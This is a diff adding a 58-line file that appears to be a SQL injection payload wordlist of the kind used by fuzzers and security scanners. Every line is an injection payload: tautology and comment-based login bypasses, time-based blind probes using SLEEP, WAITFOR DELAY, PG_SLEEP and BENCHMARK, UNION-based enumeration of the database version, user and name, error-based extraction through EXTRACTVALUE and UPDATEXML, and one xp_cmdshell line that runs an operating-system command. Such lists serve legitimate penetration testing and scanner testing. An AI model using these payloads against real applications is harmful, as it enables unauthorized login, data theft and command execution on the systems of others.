@@ -1,0 +1,58 @@
+'
+"
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+") or "1"="1"--
+") or ("1"="1"--
+' OR 'x'='x
+' OR 'x'='x'--
+" OR "x"="x
+" OR "x"="x"--
+') or ('1'='1
+') or ('1'='1'--
+' waitfor delay '0:0:5'--
+1' waitfor delay '0:0:5'--
+'; waitfor delay '0:0:5'--
+1; waitfor delay '0:0:5'--
+' AND SLEEP(5)--
+1' AND SLEEP(5)--
+' AND 1=1--
+' AND 1=2--
+1' AND '1'='1
+1' AND '1'='2
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION ALL SELECT NULL,NULL,NULL--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND BENCHMARK(5000000,MD5('test'))--
+1' AND BENCHMARK(5000000,MD5('test'))--
+' AND PG_SLEEP(5)--
+1' AND PG_SLEEP(5)--
+'; EXEC xp_cmdshell('ping 127.0.0.1')--
+' UNION SELECT @@version--
+' UNION SELECT NULL,@@version--
+' UNION SELECT user()--
+' UNION SELECT NULL,user()--
+' UNION SELECT database()--
+' UNION SELECT NULL,database()--
+' AND 1=CONVERT(int, (SELECT @@version))--
+' AND 1=CONVERT(int, (SELECT user))--
+'||(SELECT '')||'
+'||(SELECT '' FROM dual)||'
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user())))--
+' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1)--
+' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)--
